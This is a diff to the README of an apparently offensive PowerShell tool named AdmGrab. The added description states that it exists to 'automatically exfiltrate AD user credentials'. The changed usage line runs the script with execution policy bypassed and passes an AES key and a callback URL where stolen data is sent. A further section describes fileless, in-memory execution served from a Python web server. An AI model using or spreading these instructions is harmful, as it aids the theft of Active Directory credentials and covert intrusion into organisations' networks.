@@ -1,8 +1,9 @@
 # AdmGrab
+Automatically exfiltrate AD user credentials.
 
 ## Local Execution
 For execution from file, use
-`powershell.exe -ExecutionPolicy ByPass -File AdmGrab.ps1`
+`powershell.exe -ExecutionPolicy ByPass -File AdmGrab.ps1 -aesKey=KEY -callbackUrl=URL`
 
 ## Remote Execution
 To enforce execution in memory start a python webserver in the folder the AdmGrab.ps1 is located
